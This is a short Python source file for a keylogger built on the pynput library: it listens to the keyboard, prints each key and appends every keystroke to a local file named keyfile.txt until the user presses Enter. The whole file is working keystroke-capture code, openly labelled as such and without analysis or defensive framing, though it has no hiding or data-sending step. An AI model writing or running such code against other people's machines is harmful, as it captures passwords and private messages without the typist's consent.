from pynput import keyboard

class KeyLogger:
    def __init__(self):
        self.listener = keyboard.Listener(on_press=self.key_pressed) # Creates a listner
        self.listener.start() # Starts the listner
        input("Press Enter to stop the keylogger...")

    def key_pressed(self, key): # Takes keys typed and stores in a file
        print(str(key))
        with open("keyfile.txt", 'a') as logkey:
            try:
                logkey.write(key.char)
            except AttributeError:
                logkey.write(f'[{key}]')
            except Exception as e:
                print(f"Error logging key: {e}")

if __name__ == "__main__":
    KeyLogger()
